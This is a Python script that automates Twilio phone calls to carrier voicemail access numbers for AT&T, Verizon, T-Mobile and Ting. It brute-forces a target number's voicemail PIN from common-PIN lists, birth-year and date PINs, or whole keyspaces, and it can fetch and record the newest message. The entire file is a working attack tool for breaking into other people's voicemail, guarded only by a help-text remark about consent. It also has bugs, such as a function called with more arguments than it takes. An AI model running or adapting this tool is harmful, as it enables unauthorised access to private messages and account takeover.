import argparse
import itertools
import sys
import time
# Download the Python helper library from twilio.com/docs/python/install
from twilio.rest import Client
from twilio.base.exceptions import TwilioRestException

# Twilio setup
account_sid = "ACXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
auth_token = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
twiml_brute_force_payload = '<?xml version="1.0" encoding="UTF-8"?><Response><Pause length="30"/><Hangup/></Response>'
twiml_get_newest_message_payload = '<?xml version="1.0" encoding="UTF-8"?><Response><Pause length="10"/><Hangup/></Response>'
twiml_find_backdoor_payload = '<?xml version="1.0" encoding="UTF-8"?><Response><Pause length="10"/><Hangup/></Response>'
status_callback_url = "http://example.com/5MwSoXWTuCGj777Ht25BdXN35aoyZczDHWhyLY4A"
client = Client(account_sid, auth_token)

top_4_pins = ["1234", "1111", "0000", "1212", "7777", "1004", "2000", "4444", "2222", "6969", "9999", "3333", "5555",
              "6666", "1122", "1313", "8888", "4321", "2001", "1010"]
uncommon_4_pins = ["8557", "9047", "8438", "0439", "9539", "9539", "8196", "7063", "6093", "6827", "7394", "0859", "8957",
                   "9480", "6793", "8398", "0738", "7637", "6835", "9629", "8093", "8068"]
top_5_pins = ["12345", "11111", "55555", "00000", "54321", "13579", "77777", "22222", "12321", "99999", "33333",
              "00700", "90210", "88888", "38317", "09876", "44444", "98765", "01234", "42069"]
top_6_pins = ["123456", "123123", "111111", "121212", "123321", "666666", "000000", "654321", "696969", "112233",
              "159753", "292513", "131313", "123654", "222222", "789456", "999999", "101010", "777777", "007007"]
att_backdoors = ['2036407182', '2037228320', '2054759996', '2056134802', '2056160660', '2059019550', '2088418279',
                 '2096078211', '2133001055', '2133001059', '2142137096', '2143844805', '2145362395', '2147949901',
                 '2148869999', '2152009028', '2152856245', '2154606245', '2159209498', '2162806005', '2162806011',
                 '2174149995', '2178910771', '2482240128', '2514634248', '2515918585', '2515918585', '2543666111',
                 '2566831188', '2566831212', '2624989993', '2673371540', '3016424248', '3024236245', '3024236245',
                 '3053329009', '3054318484', '3059517272', '3059724650', '3059870264', '3102661234', '3103831234',
                 '3135204244', '3148073806', '3152479462', '3159359999', '3174374050', '3177306247', '3179194110',
                 '3232296016', '3232296017', '3302579992', '3302579992', '3344529998', '3603881234', '3604711234',
                 '3862996606', '3862996611', '4013696500', '4015800680', '4042859944', '4043102400', '4043104399',
                 '4045020020', '4056646359', '4069271001', '4077603132', '4083075049', '4083075085', '4105304141',
                 '4106934248', '4145340037', '4152036118', '4154978896', '4234886251', '4252417064', '4403820777',
                 '4432803091', '4432803092', '4787317077', '4787317708', '4799816245', '4802251694', '4802352793',
                 '4802352794', '5012139010', '5012139012', '5017726245', '5026414703', '5026416245', '5027583002',
                 '5034756539', '5102072006', '5103051234', '5103341234', '5129409999', '5132880075', '5136689901',
                 '5137201307', '5163769002', '5166060541', '5183666903', '5306131234', '5593601699', '5612711818',
                 '5613197626', '5613587999', '5628581234', '5702120022', '5702120023', '5702120026', '5702120028',
                 '5862165013', '5865049997', '6012591331', '6012788088', '6067766245', '6107336639', '6146700012',
                 '6155126245', '6157209901', '6187729900', '6192040806', '6193063020', '6232030366', '6266741234',
                 '6266751234', '6306991011', '6306991203', '6313323275', '6313323276', '6502550166', '6613403033',
                 '6625749928', '6626170999', '6627069966', '6783130788', '6783130840', '6787569922', '6787569989',
                 '7024962823', '7036098378', '7044089979', '7044518989', '7047789988', '7047789989', '7062074095',
                 '7073010007', '7073010008', '7073631234', '7075481234', '7088280217', '7088280220', '7135570445',
                 '7135570446', '7135601276', '7138221599', '7194407546', '7249209990', '7703565749', '7705954446',
                 '7752309064', '7862021771', '7862187070', '7862667627', '7862668989', '7874025465', '7874367700',
                 '7879559611', '7879559622', '8017910093', '8056377243', '8058951743', '8062529009', '8065439999',
                 '8085519959', '8133822347', '8137484268', '8139439626', '8139439627', '8153411328', '8162250010',
                 '8179999302', '8472840155', '8478140555', '8583351234', '8583421234', '8586036019', '8586036020',
                 '8607592990', '8609654181', '9014916245', '9043073305', '9043278492', '9047073733', '9084630020',
                 '9085136245', '9092132103', '9092132104', '9092621234', '9098001234', '9098311234', '9143190015',
                 '9143190016', '9163421234', '9164201545', '9164201546', '9166061234', '9167195653', '9174200498',
                 '9178030821', '9188070034', '9196036019', '9252121234', '9253210008', '9285022761', '9492941234',
                 '9542421222', '9542580077', '9545623555', '9548021001', '9562029000', '9703719275', '9703719276',
                 '9703719277', '9718320009']
# https://www.att.com/idpassets/images/support/pdf/UserGuideforVoiceMailSE.pdf
# https://www.customerservice.att.com/assets/pdf/VM_UserGuide_WalletCard.pdf
att_home_backdoor = '8882888893'
ting_backdoor = '8056377243'
tmobile_backdoor = '8056377243'
verizon_backdoors = ['5153219200', '5099939200', '4434656245', '3034899200', '2088669200']
# https://www.verizon.com/support/alternate-international-voice-mail/
# 8456138700 - Voicemail system for wireless?


def generate_year_pins():
    years = []
    # gives us 1900 - 2022
    for year in range(1900, 2023):
        years.append(year)
    return years


def generate_month_year_pins():
    month_year = []
    months = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12']
    for month in months:
        for one_hundred in range(0, 100):
            if len(str(one_hundred)) == 1:
                month_year.append(f'{month}0{one_hundred}')
            else:
                month_year.append(f'{month}{one_hundred}')
    return month_year


def generate_pins(number):
    the_list = []
    # generates pins dependent on `number`.
    # If `number` is 3 for example, will create all PINs from 000 to 999
    # If `number` is 4 for example, will create all PINs from 0000 to 9999, etc, etc.
    for each in itertools.product(range(0, 10), repeat=number):
        the_list.append(''.join(str(x) for x in each))
    return the_list


def generate_all_common():
    all_four = generate_pins(4)
    all_five = generate_pins(5)
    all_six = generate_pins(6)
    all_seven = generate_pins(7)
    return all_four + all_five + all_six + all_seven


# ATT uses 4-10 digit pins - needs verified
# https://www.att.com/support/article/wireless/KM1008685 says 7 - 15
def generate_all_att():
    four_through_seven = generate_all_common()
    eight = generate_pins(8)
    nine = generate_pins(9)
    ten = generate_pins(10)
    all_att = four_through_seven + eight + nine + ten
    return all_att


# Tmobile uses 4-9 according to calling a voicemail box and being prompted to put in a 4-9 digit pin
def generate_all_tmobile():
    four_through_seven = generate_all_common()
    eight = generate_pins(8)
    nine = generate_pins(9)
    all_tmobile = four_through_seven + eight + nine
    return all_tmobile


# Verizon uses 4-7 according to https://www.verizon.com/support/knowledge-base-17076/
def generate_all_verizon():
    all_verizon = generate_all_common()
    return all_verizon


def find_att_backdoor(each):
    call = client.calls.create(
        to=each,
        from_=args.callerid,
        send_digits=f'ww{args.usernumber}w#',
        twiml=twiml_find_backdoor_payload,
        status_callback=status_callback_url,
        status_callback_method="GET",
        status_callback_event=["answered", "completed"],
        record="true")
    call_queued = False
    call_in_progress = False
    call_ringing = False
    call_info = client.calls(call.sid).fetch()
    call_status = call_info.status
    while call_status != 'completed':
        time.sleep(1)
        call_info = client.calls(call.sid).fetch()
        call_status = call_info.status
        if call_status == 'queued':
            if not call_queued:
                call_queued = True
                print('The call is currently: QUEUED')
        elif call_status == 'ringing':
            if not call_ringing:
                call_ringing = True
                print('The call is currently: RINGING')
        elif call_status == 'in-progress':
            if call_queued:
                call_queued = False
            if not call_in_progress:
                call_in_progress = True
                print('The call is currently: IN PROGRESS')
    if call_status == 'completed':
        call_duration = call_info.duration
        recording = client.recordings \
            .list(call_sid=call.sid, limit=1)
        recording_sid = [x.sid for x in recording][0]
        call_record_url = f"https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Recordings/{recording_sid}.wav"
    if call.duration >= 15:
        return True, each
    else:
        return False, False


def find_verizon_backdoor(each):
    call = client.calls.create(
        to=each,
        from_=args.callerid,
        send_digits=f'ww{args.usernumber}w#',
        twiml=twiml_find_backdoor_payload,
        status_callback=status_callback_url,
        status_callback_method="GET",
        status_callback_event=["answered", "completed"],
        record="true")
    call_queued = False
    call_in_progress = False
    call_ringing = False
    call_info = client.calls(call.sid).fetch()
    call_status = call_info.status
    while call_status != 'completed':
        time.sleep(1)
        call_info = client.calls(call.sid).fetch()
        call_status = call_info.status
        if call_status == 'queued':
            if not call_queued:
                call_queued = True
                print('The call is currently: QUEUED')
        elif call_status == 'ringing':
            if not call_ringing:
                call_ringing = True
                print('The call is currently: RINGING')
        elif call_status == 'in-progress':
            if call_queued:
                call_queued = False
            if not call_in_progress:
                call_in_progress = True
                print('The call is currently: IN PROGRESS')
    if call_status == 'completed':
        call_duration = call_info.duration
        recording = client.recordings \
            .list(call_sid=call.sid, limit=1)
        recording_sid = [x.sid for x in recording][0]
        call_record_url = f"https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Recordings/{recording_sid}.wav"
    if call_duration >= 20:
        return True, each
    else:
        return False, False


def find_backdoor(args):
    backdoor = False
    if args.carrier == 'att':
        for each in att_backdoors:
            found, backdoor = find_att_backdoor(each)
            if found:
                break
    elif args.carrier == 'ting':
        backdoor = ting_backdoor
    elif args.carrier == "tmobile":
        backdoor = tmobile_backdoor
    elif args.carrier == 'verizon':
        for each in verizon_backdoors:
            found, backdoor = find_verizon_backdoor(each)
            if found:
                break
    if backdoor:
        return backdoor
    else:
        print('Your backdoor was not found')
        sys.exit()


def retrieve_payload_message(args):
    payload = False
    if args.carrier == 'att':
        payload = '#ww' + args.usernumber + 'www' + args.pin
    elif args.carrier == 'ting':
        payload = "*" + args.usernumber + "#" + args.pin + "#*ww1"
    elif args.carrier == "tmobile":
        payload = "*" + args.usernumber + "#" + args.pin + "#*ww1"
    elif args.carrier == 'verizon':
        payload = '#' + args.usernumber + "#" + args.pin + "#*ww1"
    if payload:
        return payload
    else:
        print('Your payload is not implemented yet.')
        sys.exit()


def retrieve_payload_bruteforce(args, pins):
    payload = False
    if len(pins) != 1:
        if args.carrier == 'att':
            payload = '#ww' + args.usernumber + 'www' + '#'.join(pins)
        elif args.carrier == 'ting':
            print('Needs to be implemented')
        elif args.carrier == "tmobile":
            print('Needs to be implemented')
        elif args.carrier == 'verizon':
            payload = '#www' + args.usernumber + 'www' + '#'.join(pins)
    else:
        if args.carrier == 'att':
            payload = '#ww' + args.usernumber + 'www' + pins
        elif args.carrier == 'ting':
            print('Needs to be implemented')
        elif args.carrier == "tmobile":
            print('Needs to be implemented')
        elif args.carrier == 'verizon':
            payload = '#www' + args.usernumber + 'www' + pins
    if payload:
        return payload
    else:
        print('Your payload is not implemented yet.')
        sys.exit()


def retrieve_newest_message(args):
    payload = retrieve_payload_message(args)
    if args.backdoornumber:
        to_number = args.backdoornumber
    else:
        to_number = find_backdoor(args)
    call = client.calls.create(
            to=to_number,
            from_=args.callerid,
            send_digits=payload,
            twiml=twiml_get_newest_message_payload,
            status_callback=status_callback_url,
            status_callback_method="GET",
            status_callback_event=["answered", "completed"],
            record="true")
    call_queued = False
    call_in_progress = False
    call_ringing = False
    call_info = client.calls(call.sid).fetch()
    call_status = call_info.status
    while call_status != 'completed':
        time.sleep(1)
        call_info = client.calls(call.sid).fetch()
        call_status = call_info.status
        if call_status == 'queued':
            if not call_queued:
                call_queued = True
                print('The call is currently: QUEUED')
        elif call_status == 'ringing':
            if not call_ringing:
                call_ringing = True
                print('The call is currently: RINGING')
        elif call_status == 'in-progress':
            if call_queued:
                call_queued = False
            if not call_in_progress:
                call_in_progress = True
                print('The call is currently: IN PROGRESS')
    if call_status == 'completed':
        call_duration = call_info.duration
        recording = client.recordings \
            .list(call_sid=call.sid, limit=1)
        recording_sid = [x.sid for x in recording][0]
        call_record_url = f"https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Recordings/{recording_sid}.wav"
        print(f'This call lasted {call_duration} seconds')
        print('The recording for this call can be accessed at the following URL:')
        print(call_record_url)


def rock_and_roll(args, payload, backdoor):
    call = client.calls.create(
            to=backdoor,
            from_=args.callerid,
            send_digits=payload,
            twiml=twiml_brute_force_payload,
            status_callback=status_callback_url,
            status_callback_method="GET",
            status_callback_event=["answered", "completed"],
            record="true")
    call_queued = False
    call_in_progress = False
    call_ringing = False
    call_info = client.calls(call.sid).fetch()
    call_status = call_info.status
    while call_status != 'completed':
        time.sleep(1)
        call_info = client.calls(call.sid).fetch()
        call_status = call_info.status
        if call_status == 'queued':
            if not call_queued:
                call_queued = True
                print('The call is currently: QUEUED')
        elif call_status == 'ringing':
            if not call_ringing:
                call_ringing = True
                print('The call is currently: RINGING')
        elif call_status == 'in-progress':
            if call_queued:
                call_queued = False
            if not call_in_progress:
                call_in_progress = True
                print('The call is currently: IN PROGRESS')
    if call_status == 'completed':
        call_duration = int(call_info.duration)
        recording = client.recordings \
            .list(call_sid=call.sid, limit=1)
        recording_sid = [x.sid for x in recording][0]
        call_record_url = f"https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Recordings/{recording_sid}.wav"
        if call_duration >= 20:
            return True, True
        elif call_duration >= 15:
            return False, True
        else:
            return False, False


def individual_pins(args):
    the_pins = []
    non_carrier_specific_pins = [args.top_4_pins, args.top_5_pins, args.top_6_pins,
                                 args.uncommon_four_pins, args.year_pins, args.month_year_pins, args.pins]
    if args.pins is not None:
        the_pins = the_pins + args.pins

    if args.all_four_pins:
        the_pins = the_pins + generate_pins(4)
        if args.top_4_pins:
            pass
    else:
        if args.top_4_pins:
            the_pins = the_pins + top_4_pins
            print(the_pins)
        if args.uncommon_four_pins:
            the_pins = the_pins + uncommon_4_pins
        if args.year_pins:
            the_pins = the_pins + generate_year_pins()
        if args.month_year_pins:
            the_pins = the_pins + generate_month_year_pins()

    if args.all_five_pins:
        the_pins = the_pins + generate_pins(5)
        #if args.top_five_digit_pins:
        #    pass
    else:
        if args.top_5_pins:
            the_pins = the_pins + top_5_pins

    if args.all_six_pins:
        the_pins = the_pins + generate_pins(6)
        #if args.top_six_digit_pins:
        #    pass
    else:
        if args.top_6_pins:
            the_pins = the_pins + top_6_pins

    if args.all_seven_pins:
        the_pins = the_pins + generate_pins(7)
    if args.all_eight_pins:
        if args.carrier not in ['verizon']:
            the_pins = the_pins + generate_pins(8)
    if args.all_nine_pins:
        if args.carrier not in ['verizon']:
            the_pins = the_pins + generate_pins(9)
    if args.all_ten_pins:
        if args.carrier not in ['ting', 'tmobile', 'verizon']:
            the_pins = the_pins + generate_pins(10)
    return the_pins


def which_pins(args):
    # ATT uses 4-10 digit pins - needs verified
    # Tmobile uses 4-9 according to calling a voicemail box and being prompted to put in a 4-9 digit pin
    # Verizon uses 4-7 according to https://www.verizon.com/support/knowledge-base-17076/
    all_pins = []
    att_all_pins = [args.all_four_pins, args.all_five_pins, args.all_six_pins, args.all_seven_pins,
                    args.all_eight_pins, args.all_nine_pins, args.all_ten_pins]
    ting_all_pins = [args.all_four_pins, args.all_five_pins, args.all_six_pins, args.all_seven_pins,
                     args.all_eight_pins, args.all_nine_pins]
    tmobile_all_pins = [args.all_four_pins, args.all_five_pins, args.all_six_pins, args.all_seven_pins,
                        args.all_eight_pins, args.all_nine_pins]
    verizon_all_pins = [args.all_four_pins, args.all_five_pins, args.all_six_pins, args.all_seven_pins]

    if args.all_carrier_pins:
        if args.carrier == 'att':
            all_pins = generate_all_att()
        elif args.carrier == 'ting':
            all_pins = generate_all_tmobile()
        elif args.carrier == 'tmobile':
            all_pins = generate_all_tmobile()
        elif args.carrier == 'verizon':
            all_pins = generate_all_verizon()
    else:
        if args.carrier == 'att':
            if any(att_all_pins):
                if all(att_all_pins):
                    print('You could have just used `--allpins` which would have been a lot easier.')
                    all_pins = generate_all_att()
                else:
                    all_pins = individual_pins(args)
            else:
                all_pins = individual_pins(args)

        elif args.carrier == 'ting':
            if any(ting_all_pins):
                if all(ting_all_pins):
                    print('You could have just used `--allpins` which would have been a lot easier.')
                    all_pins = generate_all_tmobile()
                else:
                    all_pins = individual_pins(args)
            else:
                all_pins = individual_pins(args)

        elif args.carrier == 'tmobile':
            if any(tmobile_all_pins):
                if all(tmobile_all_pins):
                    print('You could have just used `--allpins` which would have been a lot easier.')
                    all_pins = generate_all_tmobile()
                else:
                    all_pins = individual_pins(args)
            else:
                all_pins = individual_pins(args)

        elif args.carrier == 'verizon':
            if any(verizon_all_pins):
                if all(verizon_all_pins):
                    print('You could have just used `--allpins` which would have been a lot easier.')
                    all_pins = generate_all_verizon()
                else:
                    all_pins = individual_pins(args)
            else:
                all_pins = individual_pins(args)
    return all_pins


def bruteforce(args):
    found = False
    pins_to_use = which_pins(args)
    if not args.backdoornumber:
        backdoor = find_backdoor(args)
    else:
        backdoor = args.backdoornumber
    start = 0
    end = 3
    while not found:
        print(pins_to_use)
        pins = pins_to_use[start:end]
        print(pins)
        if pins != []:
            payload = retrieve_payload_bruteforce(args, pins)
            found, possible = rock_and_roll(args, payload, backdoor, pins)
            if possible:
                for pin in pins:
                    payload = retrieve_payload_bruteforce(args, pin)
                    found, possible = rock_and_roll(args, payload, backdoor, pins)
                    if found:
                        print(f'The PIN for {args.usernumber} is {pin}')
            else:
                start += 3
                end += 3
        else:
            print("You've exhausted your selected PINs.")
            sys.exit(0)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='voicemail_automator.py')
    subparsers = parser.add_subparsers(help='commands')

    bruteforce_parser = subparsers.add_parser('bruteforce', help='Bruteforce voicemail PIN')
    bruteforce_parser.set_defaults(parser='bruteforce')
    bruteforce_parser.add_argument("--usernumber", dest="usernumber", required=True,
                                   help="User's phone number -- either the user's or someone who you have consent from")
    bruteforce_parser.add_argument("--carrier", dest="carrier", required=True, choices=['att', 'ting', 'tmobile', 'verizon'],
                                   help="User's phone carrier")
    bruteforce_parser.add_argument("--callerid", dest="callerid", required=True, help="Phone number the call is originating from")
    bruteforce_parser.add_argument("--backdoornumber", dest="backdoornumber", metavar="0008675309",
                                   help="Voicemail backdoor number, if you know it")
    bruteforce_parser.add_argument("--toppins", dest="top_4_pins", action="store_true",
                                   help="Try the Top 20 4-digit PINs")
    bruteforce_parser.add_argument("--topfivedigitpins", dest="top_5_pins", action="store_true",
                                   help="Try the Top 20 5-digit PINs")
    bruteforce_parser.add_argument("--topsixdigitpins", dest="top_6_pins", action="store_true",
                                   help="Try the Top 20 6-digit PINs")
    bruteforce_parser.add_argument("--uncommonpins", dest="uncommon_four_pins", action="store_true",
                                   help="Try the least common 4-digit PINs")
    bruteforce_parser.add_argument("--yearpins", dest="year_pins", action="store_true",
                                   help="Try PINs from 1900 to 2022 representing birthyears")
    bruteforce_parser.add_argument("--monthyearpins", dest="month_year_pins", action="store_true",
                                   help="Try a combination of month/year PINs. For example, 1225 represents December 25th")
    bruteforce_parser.add_argument("--allpins", dest="all_carrier_pins", action="store_true",
                                   help="Try all of your carrier's PIN keyspace")
    bruteforce_parser.add_argument("--all4pins", dest="all_four_pins", action="store_true", help="Try all 4-digit PINs")
    bruteforce_parser.add_argument("--all5pins", dest="all_five_pins", action="store_true", help="Try all 5-digit PINs")
    bruteforce_parser.add_argument("--all6pins", dest="all_six_pins", action="store_true", help="Try all 6-digit PINs")
    bruteforce_parser.add_argument("--all7pins", dest="all_seven_pins", action="store_true",
                                   help="Try all 7-digit PINs")
    bruteforce_parser.add_argument("--all8pins", dest="all_eight_pins", action="store_true",
                                   help="Try all 8-digit PINs")
    bruteforce_parser.add_argument("--all9pins", dest="all_nine_pins", action="store_true", help="Try all 9-digit PINs")
    bruteforce_parser.add_argument("--all10pins", dest="all_ten_pins", action="store_true",
                                   help="Try all 10-digit PINs")
    bruteforce_parser.add_argument("--pins", nargs='+', dest="pins", metavar="8675 0309",
                                   help="Try a list of user provided PINs")

    message_parser = subparsers.add_parser('message', help='Retrieve newest message')
    message_parser.set_defaults(parser='message')
    message_parser.add_argument("--usernumber", required=True,
                                help="User's phone number -- either the user's or someone who you have consent from")
    message_parser.add_argument("--carrier", required=True, choices=['att', 'ting', 'tmobile', 'verizon'],
                                help="User's phone carrier")
    message_parser.add_argument("--callerid", required=True, help="Phone number the call is originating from")
    message_parser.add_argument("--pin", required=True, help="Voicemail's PIN")
    message_parser.add_argument("--backdoornumber", dest="backdoornumber", metavar="0008675309",
                                help="Voicemail backdoor number")

    args = parser.parse_args()
    print(args)

    if args.parser == 'bruteforce':
        bruteforce(args)
    elif args.parser == 'message':
        retrieve_newest_message(args)
